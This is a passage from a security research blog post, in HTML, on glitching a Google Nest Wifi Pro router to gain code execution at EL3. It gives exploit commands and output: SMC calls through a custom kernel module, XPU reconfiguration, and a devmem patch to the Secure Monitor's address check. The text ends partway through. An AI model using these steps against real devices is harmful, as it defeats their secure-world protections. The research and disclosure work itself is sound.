@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="utf-8">
+	<title>Google Wifi Pro: Glitching from Root to EL3</title>
+
+	<!-- mobile responsive meta -->
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="description" content="Raelize provides top-notch embedded device security serrvices like consultancy, testing, research and training.">
+	
+	<meta name="author" content="Raelize B.V.">
+	<meta name="generator" content="Hugo 0.148.1">
+
+	<!-- plugins -->
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/bootstrap/bootstrap.min.css">
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/themify-icons/themify-icons.css">
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/magnific-popup/magnific-popup.css">
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/slick/slick.css">
+	
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Anaheim%7cQuattrocento&#43;Sans:400,700&amp;display=swap">
+	
+
+	<!-- Main Stylesheet -->
+	
+	<link rel="stylesheet" href="https://raelize.com/css/style.min.css" media="screen">
+
+	<!-- Custom stylesheet - for your changes -->
+	
+  <link rel="stylesheet" href="https://raelize.com/css/custom.min.css" media="screen">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="https://raelize.com/images/Uk3Fdpje_400x400.jpg" type="image/x-icon">
+	<link rel="icon" href="https://raelize.com/images/Uk3Fdpje_400x400.jpg" type="image/x-icon">
+
+	
+	<!-- Global Site Tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-135892271-3"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', 'UA-135892271-3');
+	</script>
+	
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+
+<body id="body" data-spy="scroll" data-target=".navbar" data-offset="55">
+  <div id="content">
+    
+ <section class="sticky-top navigation">
+	<div class="container">
+		<nav class="navbar navbar-expand-lg navbar-dark">
+			<a class="navbar-brand p-0" href="/">
+				
+				<img class="lozad" data-src="https://raelize.com/images/logo.png" alt="Raelize - Embedded Device Security Services Consultancy Testing Research Training" height="42">
+				
+			</a>
+
+			<button class="navbar-toggler rounded-0" type="button" data-toggle="collapse" data-target="#navigation">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div class="collapse navbar-collapse" id="navigation">
+				<ul class="navbar-nav ml-auto">
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/about">about</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/#services">overview</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/training">training</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/consultancy">consultancy</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/testing">testing</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/publications">publications</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/blog">blog</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/resources">resources</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/#contact">contact</a>
+					</li>
+					
+				</ul>
+				
+			</div>
+		</nav>
+	</div>
+</section>
+
+
+<section class="section">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 text-center">
+                <hr />
+                <h2>Google Wifi Pro: Glitching from Root to EL3</h2>
+                
+                <h3>Part 3 - Arbitrary code execution</h3>
+                
+                <p>Thursday, Jul 17, 2025</p>
+                <hr />
+                
+            </div>
+            <div class="col-lg-8 offset-lg-2">
+                <div class="post-single-content" background-color="0xff"><p>At the end of 2023, we started analyzing the security of Google&rsquo;s <a href="https://store.google.com/product/nest_wifi_pro">Nest Wifi Pro</a>. Of course, besides overcoming several physical practicalities (i.e., dumping the flash), this involves a significant amount of software reverse engineering. As likely evident from our previously conducted research, at Raelize, we like to look beyond the software stack. So, in line with our DNA, while reverse engineering the software stack, we decided to test the resilience of the Google Nest Wifi Pro to electromagnetic (EM) glitches as well.</p>
+<p>Please note, we have actually discovered several software vulnerabilities, mostly in low-level components running at a high privilege. However, none of these vulnerabilities has surfaced yet in Google (or Qualcomm 😗) monthly security bulletins. Hence, we will have to postpone discussing them to a later time.</p>
+<p>In a series of posts, we will discuss a hardware vulnerability that we successfully exploited using EM glitches. Note, this attack was already discussed at at <a href="https://hardwear.io/usa-2025/speakers/cristofaro-mune.php">hardwear.io USA 2025</a> (<a href="https://raelize.com/upload/research/2025/Hw_io-USA-2025_EL3vated-Privileges-Glitching-Google-Wifi-Pro-from-Root-to-EL3_v1.0.pdf">slides</a>).</p>
+<ul>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-1-characterization/">Google Wifi Pro: Glitching from Root to EL3 - Part 1 - Characterization</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/">Google Wifi Pro: Glitching from Root to EL3 - Part 2 - Arbitrary read/write at EL3</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/">Google Wifi Pro: Glitching from Root to EL3 - Part 3 - Arbitrary code exec at EL3</a></li>
+</ul>
+<p>In this third post, we will explain in detail, how we were able get arbitrary code execution at EL3 leveraging the arbitrary write described in the previous post.</p>
+<p>We have organized the content in the following sections:</p>
+<ul>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#attack-identification">Background</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#attack-hypothesis">Attack hypothesis</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#attack-code">Attack code</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#attacks">Attacks</a>
+<ul>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#reconfigure-ddr0_mpu-xpu">Reconfigure DDR0_MPU XPU</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#patch-is_allowed_address-check-in-el3-code">Patch is_allowed_address check in EL3 code</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#patch-el3-code-for-arbitrary-code-execution">Patch EL3 code for arbitrary code execution</a></li>
+</ul>
+</li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#video-demonstration">Video demonstration</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#mitigations">Mitigations</a></li>
+<li><a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-3-arbitrary-code-exec/#conclusion">Conclusion</a></li>
+</ul>
+<p>We hope you appreciate this post; have fun! :)</p>
+<h2 id="background">Background</h2>
+<hr>
+<p>Using an EM glitch, we can read 4 bytes from, and write 4 bytes to, any address accessible by the Secure Monitor (EL3). The memory containing EL3 code and S-EL1 code is expected to be readable and executable, but not writable. So, it&rsquo;s likely not possible to patch code using this technique. We tried to do it anyway, but we did not succeed, indeed, confirming our expectation that the Secure Monitor (EL3) is not able to write executable memory regions.</p>
+<p>As the success rate of our EMFI attack is quite low, it&rsquo;s also likely infeasible to perform multiple reads or writes without resetting Google&rsquo;s Nest Wifi Pro. So, ideally, we should devise an attack that uses a single read or write to compromise the entire system.</p>
+<p>We decided to target the hardware preventing the REE access to Secure Memory. This so-called TrustZone Address Space Controller (TZASC) is a programmable unit that enables you to configure memory regions of selected peripherals with different access rights for Secure and Non-secure transactions. Qualcomm implemented this using their XPU technology which is decscribed in some detail in this <a href="https://www.qualcomm.com/content/dam/qcomm-martech/dm-assets/documents/whitepaper_0.pdf">document</a>. Moreover, <a href="https://blog.quarkslab.com/analysis-of-qualcomm-secure-boot-chains.html">bits</a> and <a href="https://www.tuv-nederland.nl/assets/files/cerfiticaten/2022/10/nscib-cc-0436062-stlite_revac.pdf">pieces</a> have been published by others. Nonetheless, a detailed description of the XPU security features, implementation, functioning and recommended configuration is not publicly available.</p>
+<h2 id="attack-hypothesis">Attack hypothesis</h2>
+<hr>
+<p>The XPU configuration is conveniently dumped when the REE accesses an address that&rsquo;s configured as Secure Memory. For example, when the REE tries to read address <code>0x4ac00000</code> using <code>devmem</code>, an exception is thrown as is shown below.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # devmem 0x4ac00000
+</span></span><span style="display:flex;"><span>[ 5007.321750] 8&lt;--- cut here ---
+</span></span><span style="display:flex;"><span>[ 5007.321780] Unhandled fault: external abort on non-linefetch (0x008) at 0x76fe7000
+</span></span><span style="display:flex;"><span>[ 5007.323696] pgd = 1ab15f0a
+</span></span><span style="display:flex;"><span>[ 5007.331240] [76fe7000] *pgd=7b39a835, *pte=4ac09783, *ppte=4ac09e33
+</span></span><span style="display:flex;"><span>[ 5007.334018] WARN: Access Violation!!!, Run &#34;cat /sys/kernel/debug/qti_debug_logs/tz_log&#34; for more details
+</span></span><span style="display:flex;"><span>Bus error (core dumped)
+</span></span><span style="display:flex;"><span>/ #
+</span></span></code></pre></div><p>The error message conveniently points us to the <code>tz_log</code> file, where more information is provided. In the logs, the entire configuration for a particular XPU is provided. In this case, it dumped the configuration from the <code>DDR0_MPU</code> which is used to protect the DDR memory. In our understanding, most hardware modules, including various memories, have their own dedicated XPU.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ <span style="color:#75715e"># tail /sys/kernel/debug/qti_debug_logs/tz_log -n 36</span>
+</span></span><span style="display:flex;"><span> xpu: ISR begin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032308c<span style="color:#f92672">]</span>XPU ERROR: Non Sec!!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032384a<span style="color:#f92672">]</span>XPU INTR 0:1 &gt;&gt; 00000000:00000020
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032412a<span style="color:#f92672">]</span>xpu:&gt;&gt;&gt; <span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> XPU error dump, XPU id <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>DDR0_MPU<span style="color:#f92672">)&lt;&lt;&lt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00324a24<span style="color:#f92672">]</span> xpu: uErrorFlags: <span style="color:#ae81ff">00000002</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00325199<span style="color:#f92672">]</span>xpu:  HAL_XPU2_ERROR_F_CLIENT_PORT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c003259bb<span style="color:#f92672">]</span> uBusFlags: <span style="color:#ae81ff">00041429</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032618b<span style="color:#f92672">]</span>xpu:  HAL_XPU2_BUS_F_ERROR_AC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00326973<span style="color:#f92672">]</span>xpu:  HAL_XPU2_BUS_F_AINNERSHARED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00327196<span style="color:#f92672">]</span>xpu:  HAL_XPU2_BUS_F_APROTNS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00327958<span style="color:#f92672">]</span>xpu:  HAL_XPU2_BUS_F_ABURST
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00328119<span style="color:#f92672">]</span>xpu:  HAL_XPU2_BUS_F_ARDALLOCATE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c00328911<span style="color:#f92672">]</span>xpu:  HAL_XPU2_BUS_F_SECURE_RG_MATCH
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c003290cb<span style="color:#f92672">]</span> xpu: uPhysicalAddress: 4ac00000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032992d<span style="color:#f92672">]</span> xpu: uMasterId: 00000000, uAVMID   : <span style="color:#ae81ff">00000003</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032a103<span style="color:#f92672">]</span> xpu: uATID    : 0000001b, uABID    : <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032a964<span style="color:#f92672">]</span> xpu: uAPID    : 00000000, uALen    : <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032b192<span style="color:#f92672">]</span> xpu: uASize   : 00000002, uAPReqPriority   : <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1c0032b971<span style="color:#f92672">]</span>ts:0x1c0032b38e
+</span></span><span style="display:flex;"><span>xpu: uAMemType: <span style="color:#ae81ff">00000000</span>
+</span></span><span style="display:flex;"><span>xpu: Prt: 0: Start: 0x40000000, End: 0x4ac00000, Perm0: 0xffffffff, Perm1: 0xffff, Cfg: 0x1
+</span></span><span style="display:flex;"><span>xpu: Prt: 1: Start: 0x4ac00000, End: 0x4ad11000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 2: Start: 0x4ad11000, End: 0x4ad12000, Perm0: 0xc0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 3: Start: 0x4ad12000, End: 0x4ad14000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 4: Start: 0x4ad14000, End: 0x4ad15000, Perm0: 0x55555555, Perm1: 0x5555, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 5: Start: 0x4ad15000, End: 0x4ad16000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 6: Start: 0x4ad16000, End: 0x4ad8b000, Perm0: 0xc0, Perm1: 0x0, Cfg: 0x1
+</span></span><span style="display:flex;"><span>xpu: Prt: 7: Start: 0x4ad8b000, End: 0x7ffff000, Perm0: 0xffffffff, Perm1: 0xffff, Cfg: 0x1
+</span></span><span style="display:flex;"><span>xpu: Prt: 8: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 9: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 10: Start: 0x4a400000, End: 0x4a600000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x1
+</span></span><span style="display:flex;"><span>xpu: Prt: 11: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x1
+</span></span><span style="display:flex;"><span>xpu: Prt: 12: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 13: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 14: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>xpu: Prt: 15: Start: 0xfffff000, End: 0xfffff000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>/ <span style="color:#75715e">#</span>
+</span></span></code></pre></div><p>Apparently, this specific XPU has a maximum of 16 entries, where address ranges can be defined. The most interesting entry is <code>Prt: 1</code> which configures the addresses that encompass the secure memory used by the Secure Monitor (EL3) and Secure OS (S-EL1).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>xpu: Prt: 1: Start: 0x4ac00000, End: 0x4ad11000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>The different XPUs inside Qualcomm&rsquo;s IPQ5018 SoC are configured using dedicated hardware registers. To the best of our knowledge, these can only be written by the Secure Monitor (EL3). Each XPU has its own base address from which the various registers can be accessed. We reversed the Secure Monitor (EL3) in order to identify the base address for the <code>DDR0_MPU</code> XPU.</p>
+<p>Simply searching for the string <code>DDR0_MPU</code> in the qsee binary yields a single result. Even though this address is not referenced, searching for the address of the string in the qsee binary yields again a single result. At this address a structure is stored that includes, as far as we know, the base addresses of all the XPUs for the Qualcomm&rsquo;s IPQ5018 SoC. The base address for the <code>DDR0_MPU</code> XPU is <code>0x6e000</code>. This address is likely not the same on different Qualcomm SoCs.</p>
+<p>After <em>peeking</em> and <em>poking</em> around a bit, we found out that the structure of the XPU configuration registers seems to match the structure <a href="https://blog.quarkslab.com/analysis-of-qualcomm-secure-boot-chains.html">described</a> by <a href="https://www.quarkslab.com/">Quarkslab</a> on their blog. Starting from the base address, the first <code>0x200</code> bytes are XPU control registers and then a variable number of XPU protection registers may be present. This allowed us to find the correct offsets to try to reconfigure the <code>DDR0_MPU</code> XPU.</p>
+<p>We confirmed our conclusion by reading from <code>0x6e000 + 0x2c0</code> which resulted in <code>0x4ac00000</code>. This is exactly the value we expected, the start address for the <code>Prt: 1</code> entry.</p>
+<p>We made the hypothesis that, if we can reconfigure <code>Prt: 1</code> by writing directly to the <code>DDR0_MPU</code> XPU configuration register for this entry, we may be able to remove the restrictions for the REE on this memory range. Should this work, we should be able to read and write this memory directly from the REE using <code>devmem</code>.</p>
+<h2 id="attack-code">Attack code</h2>
+<hr>
+<p>The attack code is very similar to what we used for the arbitrary read/write primitive described in <a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/">part 2</a> of this series of posts. We aim to set <code>0x6e2c0</code> to <code>0x4ac09000</code>, which should reconfigure <code>Prt: 1</code> from <code>0x4ac00000 - 0x4ad11000</code> to <code>0x4ac09000 - 0x4ad11000</code>. If such reconfiguration is actually committed by the <code>DDR0_MPU</code> XPU, it would change the boundaries of the related secure memory region, allowing us to read the memory between <code>0x4ac00000 - 0x4ac09000</code> from the REE.</p>
+<p>The attack code we used to test our hypothesis performs the following steps:</p>
+<ol>
+<li>Set trigger high by writing <code>0x3</code> to <code>0x01016004</code></li>
+<li>Execute <code>smc</code> to <code>io_access_write</code>
+<ul>
+<li><code>address</code>: <code>0x6e2c0</code></li>
+<li><code>value</code>: <code>0x4ac09000</code></li>
+</ul>
+</li>
+<li>Set trigger low by writing <code>0x0</code> to <code>0x01016004</code></li>
+<li>Attempt to read from <code>0x4ac09000</code> using <code>devmem</code></li>
+<li>Check the output of <code>devmem</code> to confirm whether the attack is successful</li>
+</ol>
+<p>The commands we execute are shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod send_t.ko _smcid=0x2000502 _para1=0x6e2c0 _para2=0x4ac09000 &amp;&amp; rmmod send_t.ko
+</span></span><span style="display:flex;"><span>[  224.747446] smc (init)!
+</span></span><span style="display:flex;"><span>[  224.747466] 00000000 00000000 0006e2c0 4ac09000 00000000 00000000
+</span></span><span style="display:flex;"><span>[  224.753431] smc (exit)!
+</span></span><span style="display:flex;"><span>/ # devmem 0x4ac00000
+</span></span><span style="display:flex;"><span>[ 226.321750] 8&lt;--- cut here ---
+</span></span><span style="display:flex;"><span>[ 226.321780] Unhandled fault: external abort on non-linefetch (0x008) at 0x76fe7000
+</span></span><span style="display:flex;"><span>[ 226.323696] pgd = 1ab15f0a
+</span></span><span style="display:flex;"><span>[ 226.331240] [76fe7000] *pgd=7b39a835, *pte=4ac09783, *ppte=4ac09e33
+</span></span><span style="display:flex;"><span>[ 226.334018] WARN: Access Violation!!!, Run &#34;cat /sys/kernel/debug/qti_debug_logs/tz_log&#34; for more details
+</span></span><span style="display:flex;"><span>Bus error (core dumped)
+</span></span><span style="display:flex;"><span>/ #
+</span></span></code></pre></div><p>When the attack is successful, the <code>devmem</code> command will return the expected value (i.e., <code>0xd29fffe1</code>), as the memory would be accessible by REE, instead of the exception triggered by the XPU, when accessing secure memory from REE.</p>
+<h2 id="attacks">Attacks</h2>
+<hr>
+<h3 id="reconfigure-ddr0_mpu-xpu">Reconfigure DDR0_MPU XPU</h3>
+<p>We used the same glitch parameters as the campaigns described in <a href="/blog/google-wifi-pro-glitching-from-root-to-el3-part-2-arbitrary-read-write/">part 2</a> of this blog post series. For this attack, the speed is slower, as the read of a secure memory address from REE triggers a time consuming exception. Therefore, this campaign of 5000 attempts took roughly 75 minutes instead of the 50 minutes required for the arbitrary read/write.</p>
+<p>The plot for this campaign is shown below.</p>
+<p style="text-align:center;">
+    <img src="/img/google/wifipro/emfi/502_xpu_narrow.png" style="max-width: 80%; width: 600px">
+    <figcaption>Focused campaign writing 0x4ac09000 to 0x6e2c0</figcaption>
+</p>
+<p>In total, for this campaign, we observed 2 successful glitches, where we were able to write <code>0x4ac09000</code> to <code>0x6e2c0</code> and read from <code>0x4ac00000</code> using the <code>devmem</code> command. This means our success rate is roughly 1 successful glitch every 37.5 minutes. We are confident this success rate could be increased, but we did not explore this any further.</p>
+<p>We created an exploit that stops the FI campaign as soon as a successful glitch is observed. Once successful, this allows us to connect <code>Minicom</code> manually to the serial interface of the Wifi Pro and send additional commands to the root shell.</p>
+<p>We confirmed that the modified XPU configuration stays intact until we reset the target. We use the device in this state, where the XPU configuration is modified, to patch the code of the Secure Monitor (EL3) directly from the REE.</p>
+<h3 id="patch-is_allowed_address-check-in-el3-code">Patch is_allowed_address check in EL3 code</h3>
+<p>Once the <code>DDR0_MPU</code> XPU is re-configured (i.e., <code>0x4ac00000</code> Secure Memory start address is set to <code>0x4ac09000</code>), we can access the secure memory from REE. This allows us to disable the address check for <code>io_access_read</code> and <code>io_access_write</code> by patching the Secure Monitor (EL3) code directly from the REE using the <code>devmem</code> command.</p>
+<p>Normally, sending arbitrary addresses as arguments to <code>io_access_read</code> and/or <code>io_access_write</code> should not be possible, as they are sanitized by the <code>is_allowed_address</code> function. This prevents, e.g., to read from <code>0x4ac00000</code> using <code>io_access_read</code> (see below).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>/ # insmod /factory/raelize/lkm/send_t.ko _smcid=0x2000501 _para1=0x4ac00000 &amp;&amp;
+</span></span><span style="display:flex;"><span>rmmod send_t
+</span></span><span style="display:flex;"><span>[ 9535.721834] smc (init)!
+</span></span><span style="display:flex;"><span>[ 9535.721876] 00000000 00000000 4ac00000 00000000 00000000 00000000
+</span></span><span style="display:flex;"><span>[ 9535.739018] smc (exit)!
+</span></span></code></pre></div><p>However, after the XPU configuration has been modified, thanks to our successful glitch, we can now patch the code of the <code>is_allowed_address</code> function itself. The function returns <code>1</code> when the address is allowed. We then patched the instruction responsible for setting the return value to return <code>1</code>, even when a non-allowed address is passed. More specifically, we change <code>mov w0, wzr</code> into <code>mov w0, #1</code> at <code>0x4ac031f0</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031C8</span>             ; <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">is_allowed_address</span>(<span style="color:#66d9ef">int</span>)
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031C8</span>             is_allowed_address
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031C8</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> B0                 ADRP            X9, <span style="color:#960050;background-color:#1e0010">#</span>allowed_addresses<span style="color:#960050;background-color:#1e0010">@</span>PAGE
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031CC</span> E8 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">1F</span> <span style="color:#ae81ff">2</span>A                 MOV             W8, WZR
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031D0</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">13</span> <span style="color:#ae81ff">91</span>                 ADD             X9, X9, <span style="color:#960050;background-color:#1e0010">#</span>allowed_addresses<span style="color:#960050;background-color:#1e0010">@</span>PAGEOFF
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031D4</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031D4</span>             loc_4AC031D4
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031D4</span> <span style="color:#ae81ff">2</span>B <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">40</span> B9                 LDR             W11, [X9]
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031D8</span> <span style="color:#ae81ff">7F</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">6</span>B                 CMP             W11, W0
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031DC</span> E0 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">54</span>                 B.EQ            loc_4AC031F8
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031E0</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">11</span>                 ADD             W8, W8, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031E4</span> <span style="color:#ae81ff">29</span> <span style="color:#ae81ff">11</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">91</span>                 ADD             X9, X9, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031E8</span> <span style="color:#ae81ff">1F</span> <span style="color:#ae81ff">1</span>D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">71</span>                 CMP             W8, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031EC</span> <span style="color:#ae81ff">49</span> FF FF <span style="color:#ae81ff">54</span>                 B.LS            loc_4AC031D4
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031F0</span> E0 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">1F</span> <span style="color:#ae81ff">2</span>A                 MOV             W0, WZR <span style="color:#75715e">// patch this to MOV W0, #1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>LOAD:<span style="color:#ae81ff">0x4AC031F4</span> C0 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">5F</span> D6                 RET
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031F8</span>             ; <span style="color:#f92672">---------------------------------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031F8</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031F8</span>             loc_4AC031F8
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031F8</span> E0 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">32</span>                 MOV             W0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031FC</span> C0 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">5F</span> D6                 RET
+</span></span><span style="display:flex;"><span>LOAD:<span style="color:#ae81ff">0x4AC031FC</span>             ; End of function is_allowed_address
+</span></span></code></pre></div><p>We do this directly from Linux user space (i.e., <code>NS-EL0</code>), by simply using <code>devmem</code> as is shown below. Should the <code>/dev/mem</code> file would be not present, or the memory allocations would be restricted, such operations must be performed from kernel space, instead.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ <span style="color:#75715e"># devmem 0x4ac031f0 32 0x320003e0</span>
